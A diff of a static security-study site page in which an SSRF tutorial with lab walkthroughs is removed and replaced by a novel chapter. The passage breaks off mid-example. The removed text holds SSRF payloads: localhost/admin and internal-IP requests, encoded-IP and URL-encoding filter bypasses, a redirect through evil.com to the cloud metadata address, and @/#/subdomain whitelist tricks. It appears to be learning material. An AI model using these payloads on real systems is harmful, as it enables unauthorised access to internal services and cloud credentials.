@@ -6,13 +6,13 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="SSRF原理、绕过技巧、内网探测、协议利用、盲打SSRF">
+        <meta name="description" content="安全学习笔记 × 青春记录 | 一个可以安全试错的环境">
       
       
         <meta name="author" content="ethicalpaws">
       
       
-        <link rel="canonical" href="https://ethicalpaws.github.io/youth-sandbox/tech-study/knowledge/03-web-basics/ssrf/ssrf/">
+        <link rel="canonical" href="https://ethicalpaws.github.io/youth-sandbox/bridge/novel/%E7%AC%AC%E4%BA%8C%E5%8D%B7%C2%B7%E5%90%AF%E7%A8%8B/%E7%AC%AC%E4%B8%80%E7%AB%A0%C2%B7%E5%90%AF%E8%88%AA%E6%97%A5/">
       
       
       
@@ -20,19 +20,19 @@
         
       
       
-      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>SSRF服务端请求伪造 - 青春沙盒</title>
+        <title>第一章·启航日 - 青春沙盒</title>
       
     
     
-      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -51,17 +51,17 @@
       
     
     
-      <link rel="stylesheet" href="../../../../../css/timeago.css">
+      <link rel="stylesheet" href="../../../../css/timeago.css">
     
-      <link rel="stylesheet" href="../../../../../assets/css/extra.css">
+      <link rel="stylesheet" href="../../../../assets/css/extra.css">
     
-      <link rel="stylesheet" href="../../../../../assets/css/home.css">
+      <link rel="stylesheet" href="../../../../assets/css/home.css">
     
       <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
-      <link rel="stylesheet" href="../../../../../asserts/css/hacker-theme.css">
+      <link rel="stylesheet" href="../../../../asserts/css/hacker-theme.css">
     
-    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -86,7 +86,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#ssrf" class="md-skip">
+        <a href="#01" class="md-skip">
           Skip to content
         </a>
       
@@ -100,7 +100,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../../../.." title="青春沙盒" class="md-header__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+    <a href="../../../.." title="青春沙盒" class="md-header__button md-logo" aria-label="青春沙盒" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
@@ -120,7 +120,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              SSRF服务端请求伪造
+              第一章·启航日
             
           </span>
         </div>
@@ -238,7 +238,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../../../.." class="md-tabs__link">
+      <a href="../../../.." class="md-tabs__link">
         
   
   
@@ -259,7 +259,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../" class="md-tabs__link">
+        <a href="../../../../tech-study/" class="md-tabs__link">
           
   
   
@@ -281,7 +281,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../../life/" class="md-tabs__link">
+        <a href="../../../../life/" class="md-tabs__link">
           
   
   
@@ -303,7 +303,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../../bridge/" class="md-tabs__link">
+        <a href="../../../" class="md-tabs__link">
           
   
   
@@ -325,7 +325,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../../updates/" class="md-tabs__link">
+        <a href="../../../../updates/" class="md-tabs__link">
           
   
   
@@ -347,7 +347,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../../spiritual/" class="md-tabs__link">
+        <a href="../../../../spiritual/" class="md-tabs__link">
           
   
   
@@ -369,7 +369,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../../../../about/" class="md-tabs__link">
+        <a href="../../../../about/" class="md-tabs__link">
           
   
   
@@ -389,7 +389,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../../../../../role-panel/" class="md-tabs__link">
+      <a href="../../../../role-panel/" class="md-tabs__link">
         
   
   
@@ -424,7 +424,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../../../.." title="青春沙盒" class="md-nav__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+    <a href="../../../.." title="青春沙盒" class="md-nav__button md-logo" aria-label="青春沙盒" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
@@ -454,7 +454,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../.." class="md-nav__link">
+      <a href="../../../.." class="md-nav__link">
         
   
   
@@ -512,7 +512,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../" class="md-nav__link ">
+            <a href="../../../../tech-study/" class="md-nav__link ">
               
   
   
@@ -593,7 +593,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../" class="md-nav__link ">
+            <a href="../../../../tech-study/knowledge/" class="md-nav__link ">
               
   
   
@@ -637,7 +637,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../01-foundation/" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/01-foundation/" class="md-nav__link">
         
   
   
@@ -665,7 +665,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../02-network-protocol-security/" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/02-network-protocol-security/" class="md-nav__link">
         
   
   
@@ -693,7 +693,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/03-web-basics/" class="md-nav__link">
         
   
   
@@ -728,7 +728,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../04-web-advanced/" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/04-web-advanced/" class="md-nav__link">
         
   
   
@@ -763,7 +763,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../05-java-security/" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/05-java-security/" class="md-nav__link">
         
   
   
@@ -791,7 +791,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../06-red-blue-confrontation/" class="md-nav__link">
+      <a href="../../../../tech-study/knowledge/06-red-blue-confrontation/" class="md-nav__link">
         
   
   
@@ -858,7 +858,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../practice/" class="md-nav__link ">
+            <a href="../../../../tech-study/practice/" class="md-nav__link ">
               
   
   
@@ -902,7 +902,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../practice/ctf/" class="md-nav__link">
+      <a href="../../../../tech-study/practice/ctf/" class="md-nav__link">
         
   
   
@@ -930,7 +930,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../practice/cve/" class="md-nav__link">
+      <a href="../../../../tech-study/practice/cve/" class="md-nav__link">
         
   
   
@@ -958,7 +958,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../practice/src/" class="md-nav__link">
+      <a href="../../../../tech-study/practice/src/" class="md-nav__link">
         
   
   
@@ -1019,7 +1019,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../weekly-check/" class="md-nav__link ">
+            <a href="../../../../tech-study/weekly-check/" class="md-nav__link ">
               
   
   
@@ -1110,7 +1110,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../life/" class="md-nav__link ">
+            <a href="../../../../life/" class="md-nav__link ">
               
   
   
@@ -1189,7 +1189,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../life/study-plan/" class="md-nav__link ">
+            <a href="../../../../life/study-plan/" class="md-nav__link ">
               
   
   
@@ -1233,7 +1233,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/study-plan/week1/" class="md-nav__link">
+      <a href="../../../../life/study-plan/week1/" class="md-nav__link">
         
   
   
@@ -1268,7 +1268,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/study-plan/week2/" class="md-nav__link">
+      <a href="../../../../life/study-plan/week2/" class="md-nav__link">
         
   
   
@@ -1303,7 +1303,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/study-plan/week3/" class="md-nav__link">
+      <a href="../../../../life/study-plan/week3/" class="md-nav__link">
         
   
   
@@ -1338,7 +1338,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/study-plan/week4/" class="md-nav__link">
+      <a href="../../../../life/study-plan/week4/" class="md-nav__link">
         
   
   
@@ -1373,7 +1373,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/study-plan/week5/" class="md-nav__link">
+      <a href="../../../../life/study-plan/week5/" class="md-nav__link">
         
   
   
@@ -1416,7 +1416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/journal/" class="md-nav__link">
+      <a href="../../../../life/journal/" class="md-nav__link">
         
   
   
@@ -1444,7 +1444,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/struggles/" class="md-nav__link">
+      <a href="../../../../life/struggles/" class="md-nav__link">
         
   
   
@@ -1497,7 +1497,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../life/wins/" class="md-nav__link ">
+            <a href="../../../../life/wins/" class="md-nav__link ">
               
   
   
@@ -1571,7 +1571,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../life/reflections/" class="md-nav__link ">
+            <a href="../../../../life/reflections/" class="md-nav__link ">
               
   
   
@@ -1615,7 +1615,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/reflections/%E7%A0%B4%E9%A2%98%E4%B9%8B%E4%BD%99-%E4%BA%A6%E7%A0%B4%E5%BF%83%E9%9A%9C/" class="md-nav__link">
+      <a href="../../../../life/reflections/%E7%A0%B4%E9%A2%98%E4%B9%8B%E4%BD%99-%E4%BA%A6%E7%A0%B4%E5%BF%83%E9%9A%9C/" class="md-nav__link">
         
   
   
@@ -1680,7 +1680,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../life/family-letters/" class="md-nav__link ">
+            <a href="../../../../life/family-letters/" class="md-nav__link ">
               
   
   
@@ -1724,7 +1724,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/family-letters/%E5%88%9D%E5%8D%87%E9%AB%98_%E7%88%B6%E4%BA%B2%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+      <a href="../../../../life/family-letters/%E5%88%9D%E5%8D%87%E9%AB%98_%E7%88%B6%E4%BA%B2%E5%AF%84%E8%AF%AD/" class="md-nav__link">
         
   
   
@@ -1752,7 +1752,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../life/family-letters/%E6%88%90%E4%BA%BA%E7%A4%BC_%E7%88%B6%E6%AF%8D%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+      <a href="../../../../life/family-letters/%E6%88%90%E4%BA%BA%E7%A4%BC_%E7%88%B6%E6%AF%8D%E5%AF%84%E8%AF%AD/" class="md-nav__link">
         
   
   
@@ -1822,7 +1822,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../bridge/" class="md-nav__link ">
+            <a href="../../../" class="md-nav__link ">
               
   
   
@@ -1866,7 +1866,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../bridge/novel/" class="md-nav__link">
+      <a href="../../" class="md-nav__link">
         
   
   
@@ -1928,7 +1928,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../updates/" class="md-nav__link ">
+            <a href="../../../../updates/" class="md-nav__link ">
               
   
   
@@ -1972,7 +1972,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../.." class="md-nav__link">
+      <a href="../../../.." class="md-nav__link">
         
   
   
@@ -2038,7 +2038,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../spiritual/" class="md-nav__link ">
+            <a href="../../../../spiritual/" class="md-nav__link ">
               
   
   
@@ -2107,7 +2107,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../spiritual/images/" class="md-nav__link ">
+            <a href="../../../../spiritual/images/" class="md-nav__link ">
               
   
   
@@ -2179,7 +2179,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../spiritual/music/" class="md-nav__link ">
+            <a href="../../../../spiritual/music/" class="md-nav__link ">
               
   
   
@@ -2251,7 +2251,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../spiritual/sentences/" class="md-nav__link ">
+            <a href="../../../../spiritual/sentences/" class="md-nav__link ">
               
   
   
@@ -2332,7 +2332,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../../../../about/" class="md-nav__link ">
+            <a href="../../../../about/" class="md-nav__link ">
               
   
   
@@ -2376,7 +2376,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../about/why/" class="md-nav__link">
+      <a href="../../../../about/why/" class="md-nav__link">
         
   
   
@@ -2411,7 +2411,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../../../role-panel/" class="md-nav__link">
+      <a href="../../../../role-panel/" class="md-nav__link">
         
   
   
@@ -2456,76 +2456,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#ssrf" class="md-nav__link">
+  <a href="#01" class="md-nav__link">
     <span class="md-ellipsis">
       
-        SSRF的本质
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSRF为什么危险
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSRF成功利用的危害
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        常见的SSRF攻击
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        绕过常见的SSRF防御
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSRF盲打
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrf_6" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        为SSRF寻找隐藏的攻击面
+        01 · 启航日
       
     </span>
   </a>
@@ -2552,326 +2486,29 @@
   
 
 
-  <h1>SSRF服务端请求伪造</h1>
+  <h1>第一章·启航日</h1>
 
-<h2 id="ssrf">SSRF的本质<a class="headerlink" href="#ssrf" title="Permanent link">&para;</a></h2>
-<ol>
-<li>什么是SSRF：是一种允许攻击者诱导服务器非预期位置发起请求的安全漏洞</li>
-<li>核心问题：服务器无条件信任用户提供的URL，并用自己的身份去访问 </li>
-</ol>
-<h2 id="ssrf_1">SSRF为什么危险<a class="headerlink" href="#ssrf_1" title="Permanent link">&para;</a></h2>
-<p>服务器通常具有很高的权限
-    1. 访问内网、云元数据服务
-    2. 读取服务器本地文件
-    3. 内网之间通常互相信任不做严格认证
-攻击者可以通过SSRF利用服务器的身份和权限</p>
-<h2 id="ssrf_2">SSRF成功利用的危害<a class="headerlink" href="#ssrf_2" title="Permanent link">&para;</a></h2>
-<ol>
-<li>在应用程序或后端系统中执行未授权操作</li>
-<li>访问未授权的数据</li>
-<li>在某些情况下执行任意命令</li>
-<li>若与第三方系统交互，攻击者可能会反向攻击托管该应用的阻止内部网络</li>
-</ol>
-<h2 id="ssrf_3">常见的SSRF攻击<a class="headerlink" href="#ssrf_3" title="Permanent link">&para;</a></h2>
-<ol>
-<li>针对服务器本身的SSRF攻击</li>
-<li>手法：利用回环网络接口（127.0.0.1 或 localhost），让应用向自己发起HTTP请求。</li>
-<li>示例：
-        购物应用查询库存时，前端提交：
-        <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>POST /product/stock HTTP/1.0
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&amp;storeId=1
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>攻击者修改 stockApi 为：
-</span></code></pre></div>
-        <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>stockApi=http://localhost/admin
-</span></code></pre></div></li>
-<li>原理：通过调用/product/stock这个服务端功能，诱导服务器自己向本机回环地址http://localhost/admin发起请求，由于该请求的源IP是127.0.0.1，绕过了基于IP的访问控制，从而获取到本不应被外网用户看到的/admin接口数据。</li>
-<li>关键点：<ol>
-<li>/admin是服务器本地独立监听的另一个应用服务</li>
-<li>SSRF让攻击者借着服务器的身份去访问该应用服务从而绕过访问控制</li>
-</ol>
-</li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-17-51-02.png" />正常请求的API<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-20-40-48.png" />修改为http://127.0.0.1/admin<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-20-42-50.png" />接着修改请求完成最终的操作<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-20-44-37.png" /></li>
-<li>针对其他后端系统的SSRF攻击</li>
-<li>原理：应用服务器能与内部不可路由的后端系统交互（如192.168.0.68），这些系统通常安全较弱。在许多情况下,内部后端系统包含一些敏感功能,任何能够与系统交互的人均可在无需身份验证的情况下访问。</li>
-<li>示例：<code>stockApi=http://192.168.0.68/admin</code></li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-02-15.png" /><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-03-58.png" />抓包发送到intruder中进行爆破扫描<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-06-03.png" />找到目标<code>192.168.0.65</code><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-07-52.png" /><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-08-48.png" /></li>
-</ol>
-<h2 id="ssrf_4">绕过常见的SSRF防御<a class="headerlink" href="#ssrf_4" title="Permanent link">&para;</a></h2>
-<ol>
-<li>绕过黑名单过滤</li>
-<li>防御：封禁 127.0.0.1、localhost、/admin 等</li>
-<li>绕过手法<ol>
-<li>十六进制、八进制等替代127.0.0.1【127.0.0.1 → 2130706433（十进制）、017700000001（八进制）、127.1】</li>
-<li>将自己的域名解析到127.0.0.1【spoofed.burpcollaborator.net】</li>
-<li>大小写绕过/URL编码【<code>http://LOCALHOST/admin</code>、<code>http://127.0.0.1/%61dmin</code>】</li>
-<li>重定向绕过【自己控制的URL重定向到目标地址，尝试不同协议切换（http→https）】<ol>
-<li>原理：利用防御层和实际请求层对重定向处理的不一致
- <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>   防御层校验：检查初始URL → 在白名单内 ✅
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>       ↓
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>   应用跟随重定向 → 跳转到内网地址
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>       ↓
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>   实际请求层：发起请求 → 访问内网资源 ✅（此时已不再校验）
-</span></code></pre></div></li>
-<li>示例：<ol>
-<li>SSRFpayload
-   <div class="language-http highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="err"> </span><span class="nf">POST</span> <span class="nn">/product/stock</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a> <span class="l">Host: vulnerable.com</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a> <span class="l">Content-Type: application/x-www-form-urlencoded</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a> stockApi=https://evil.com/redirect?to=http://169.254.169.254/latest/meta-data/
-</span></code></pre></div></li>
-<li>请求链
-   <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>1. vulnerable.com 校验 stockApi→ 域名 evil.com 不在黑名单中？✅
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>2. vulnerable.com 请求 https://evil.com/redirect?to=http://169.254.169.254/
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>3. evil.com 返回 302 重定向到 http://169.254.169.254/
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>4. vulnerable.com 跟随重定向→ 请求 http://169.254.169.254/（内网地址）→ 不再校验！
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>5. 元数据被返回 → 攻击者获得敏感信息
-</span></code></pre></div></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>实战演练：<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-22-53.png" /><ol>
-<li><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-23-45.png" />首先大小写绕过对localhost的过滤</li>
-<li><img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-26-12.png" />然后URL编码绕过对admin的过滤</li>
-<li>完成指定操作<img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-21-37-09.png" /></li>
-</ol>
-</li>
-<li>绕过白名单过滤</li>
-<li>防御：只允许匹配特定域名或开头的URL。</li>
-<li>绕过原理：利用URL解析不一致【让防御代码和实际请求代码对同一个URL解析出不同的结果——防御代码看到一个"安全"的域名，而实际HTTP请求发往攻击者控制的目标。】</li>
-<li>手法：<ol>
-<li>嵌入凭据（@符号）<ol>
-<li>payload：<code>https://expected-host:fakepassword@evil-host</code></li>
-<li>详解：在URL规范中，@符号前面部分表示用户认证信息
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>格式：protocol://username:password@hostname/path
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>示例：https://user:pass@example.com
-</span></code></pre></div>
-    <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-22-15-15.png" /></li>
-</ol>
-</li>
-<li>使用片段标识（#）<ol>
-<li>payload：<code>https://evil-host#expected-host</code></li>
-<li>详解：#在URL中表示片段标识符（Fragment），用于定位页面内的锚点。标准规定：片段标识符不会被发送到服务器。
-    <img alt="" src="../SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%2B%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2026-05-13-22-18-44.png" /> </li>
-</ol>
-</li>
-<li>DNS子域名欺骗<ol>
-<li>payload：<code>https://expected-host.evil-host</code></li>
-<li>详解：evil-host是你控制的域名，expected-host作为它的子域名前缀。</li>
-<li>攻击流程
-    <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>1. 注册域名: attacker.com
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>2. 创建子域名: trusted.attacker.com
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>3. 将 *.attacker.com 解析到自己的服务器
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>防御规则: 只允许 trusted.com
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>攻击者的Payload: https://trusted.com.attacker.com
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>                              ↑           ↑
